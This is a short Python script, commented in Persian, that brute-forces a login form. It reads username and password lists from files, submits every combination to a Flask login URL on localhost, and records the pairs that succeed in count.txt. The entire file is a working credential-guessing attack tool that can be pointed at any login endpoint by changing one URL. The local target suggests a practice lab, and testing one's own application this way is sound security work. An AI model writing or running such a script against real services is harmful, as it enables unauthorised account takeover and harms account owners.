import requests

# آدرس سرور Flask (تغییر دهید در صورت نیاز)
url = "http://127.0.0.1:5000/login"

# تابع برای خواندن یوزرنیم‌ها از فایل
def read_usernames(username_file):
    with open(username_file, 'r', encoding='utf-8') as file:
        usernames = [line.strip() for line in file.readlines()]
    return usernames

# تابع برای خواندن پسوردها از فایل
def read_passwords(password_file):
    with open(password_file, 'r', encoding='utf-8') as file:
        passwords = [line.strip() for line in file.readlines()]
    return passwords

# تابع برای امتحان کردن ترکیب یوزرنیم و پسورد
def test_login(usernames, passwords):
    count = 0
    # باز کردن فایل برای نوشتن نتایج
    with open("count.txt", 'w', encoding='utf-8') as result_file:
        for username in usernames:
            for password in passwords:
                data = {"username": username, "password": password}
                response = requests.post(url, data=data)
                # اگر پاسخ صحیح بود، چاپ و ذخیره می‌کنیم
                if "Login successful!" in response.text:
                    print(f"\033[32mCorrect combination: Username: {username}, Password: {password}\033[0m")
                    result_file.write(f"Correct combination: Username: {username}, Password: {password}\n")
                    count += 1
                    break  # پس از پیدا کردن ترکیب صحیح برای یک یوزرنیم، از حلقه پسوردها خارج می‌شویم و به یوزرنیم بعدی می‌رویم
            print(f"Finished checking username: {username}")
        print(f"\nTotal correct attempts: {count}")

# آدرس فایل‌ها برای یوزرنیم‌ها و پسوردها
username_file = "usernames.txt"  # تغییر دهید به آدرس فایل یوزرنیم‌ها
password_file = "passwords.txt"  # تغییر دهید به آدرس فایل پسوردها

# خواندن یوزرنیم‌ها و پسوردها
usernames = read_usernames(username_file)
passwords = read_passwords(password_file)

# امتحان کردن یوزرنیم‌ها و پسوردها
test_login(usernames, passwords)
